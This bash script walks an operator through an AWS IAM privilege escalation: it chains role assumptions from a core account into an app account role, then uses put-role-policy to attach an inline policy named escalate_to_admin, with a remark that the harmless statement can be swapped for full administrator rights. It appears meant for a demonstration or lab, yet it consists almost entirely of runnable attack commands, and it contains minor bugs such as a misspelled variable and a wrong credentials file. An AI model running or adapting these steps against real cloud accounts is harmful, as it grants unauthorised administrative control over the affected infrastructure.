#!/bin/bash

echo "Create a profile core_mon in ~/.aws/credentials with the id, secret and session token for user/core_mon. Press any key when done"
read anykey

echo "Assume the core account role/core_app_monitor"
aws --profile core_mon sts assume-role --role-session-name cores-${RANDOME} --role-arn arn:aws:iam::057011330707:role/core_app_monitor

echo "Replace the stale values in temp_creds with new ones from the output above. Press any key when done"
read anykey
echo "activate the creds"
source temp_global_app_mon_creds

echo "Check who you are"
aws sts get-caller-identity

echo "Use the creds for core account role/core_app_monitor to assume the app account role/global_app_monitor"
aws sts assume-role --role-session-name app_mon-${RANDOM} --role-arn arn:aws:iam::279038159887:role/global_app_monitor

echo "Replace the stale values in temp_global_app_mon_creeds with new ones from the output above. Press any key when done"
read anykey
echo "activate the creds"
source temp_global_app_mon_creds

echo "Check who you are"
aws sts get-caller-identity

echo "Check your current permissions"

echo "Add a harmless policy statement to the inline policy to demonstrate your admin privs. Replace with AWSAdministrator if you want for reals."

echo "If you had permissions to list roles you would run the following commands. In this case, we do not."
echo "aws iam list-role-policies --role-name global_app_monitor"
echo "aws iam get-role-policy --role-name global_app_monitor --policy-name app1_global_mon_inline"

echo "Add a new policy to the existing policies"
cat attack_app1_global_mon_inline_policy_admin.json
aws iam  put-role-policy --role-name global_app_monitor --policy-document file://attack_app1_global_mon_inline_policy_admin.json --policy-name escalate_to_admin

echo "Now we can list the policies"
aws iam  list-role-policies --role-name global_app_monitor
